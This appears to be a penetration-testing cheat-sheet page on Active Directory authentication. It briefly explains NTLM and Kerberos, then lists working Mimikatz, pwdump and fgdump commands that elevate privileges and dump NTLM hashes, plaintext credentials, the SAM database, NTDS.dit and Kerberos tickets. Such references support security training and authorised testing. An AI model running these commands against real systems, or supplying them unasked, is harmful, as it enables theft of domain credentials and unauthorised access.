# AD Authentication

## <mark style="color:red;">Dumping NTLM Hashes and Plaintext Credentials</mark>

NTLM authentication uses a challenge-response model, where a nonce/challenge encrypted using the user's NTLM hash is validated by the Domain Controller.

Dumping LM/NTLM hashes with Mimikatz

* [Full Mimikatz Guide](https://adsecurity.org/?page\_id=1821#SEKURLSALogonPasswords)
* Requires local admin rights.

```bash
# escalate security token to SYSTEM integrity
mimikatz > privilege::debug
mimikatz > token::elevate

# dump NTLM hashes + plaintext creds
mimikatz.exe lsadump::secrets "vault::cred /patch" lsadump::sam
mimikatz > lsadump::secrets
mimikatz > vault::cred /patch
mimikatz > lsadump::sam              # dump contents of SAM db in current host
mimikatz > sekurlsa::logonpasswords  # dump creds of logged-on users
```

Other tools

```bash
cmd> pwdump.exe localhost
cmd> fgdump.exe localhost          # improved pwdump, shutdown firewalls 
cmd> type C:\Windows\NTDS\NTDS.dit # all domain hashes in NTDS.dit file on the Domain Controller
```

## <mark style="color:red;">Dumping Kerberos Tickets</mark>

Kerberos authentication uses a ticketing system, where a Ticket Granting Ticket (TGT) is issued by the Domain Controller (with the role of Key Distribution Center (KDC)) and is used to request tickets from the Ticket Granting Service (TGS) for access to resources/systems joined to the domain.

* Hashes are stored in the Local Security Authority Subsystem Service (LSASS).
* LSASS process runs as SYSTEM, so we need SYSTEM / local admin to dump hashes stored on target.

Dumping Kerberos TGT/TGS tickets with Mimikatz

```bash
mimikatz > sekurlsa::tickets
```

See "[Service Account Attacks](ad-lateral-movement.md#service-account-attacks)" on how to abuse dumped tickets.
